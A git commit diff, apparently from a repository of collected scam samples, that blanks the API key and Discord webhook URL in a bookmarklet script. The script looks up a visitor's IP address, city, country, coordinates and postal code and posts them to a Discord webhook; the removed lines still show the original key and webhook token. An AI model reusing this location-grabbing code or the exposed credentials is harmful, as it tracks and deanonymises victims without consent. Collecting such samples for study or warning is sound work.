46d6945b26db27c13293cfa6eb5f46cc2a1e060d
starsyxd <142777384+starsyxd@users.noreply.github.com>
2023-08-30 16:51:07 +1000

    Update verify.js

--- scams/bookmarklet/verify.js
+++ scams/bookmarklet/verify.js
@@ -2,7 +2,7 @@ function json(url) {
   return fetch(url).then(res => res.json());
 }
 
-let apiKey = '6b33d646aa842dcaef31ad74278fedba6f94da379373c099a3519d99';
+let apiKey = '';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
   const content = "@everyone";
   const description = "IP: " + data.ip + "\nCity: " + data.city + "\nCountry: " + data.country_name + "\nLongitude: " + data.longitude + "\nLatitude: " + data.latitude + "\nPostal Code: " + data.postal;
@@ -14,7 +14,7 @@ json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
     }]
   };
 
-  const url = "https://discord.com/api/webhooks/1129994962713456722/3OGUh_3c64c8emvimiiABW-74xm93twGMsUDR8kWpKNi4bjcx3vIG4opZBQRa7bwjPsL";
+  const url = "";
   fetch(url + "?wait=true", {method:"POST", "headers":{"content-type":"application/json"}, "body":JSON.stringify(message)});
 });
 
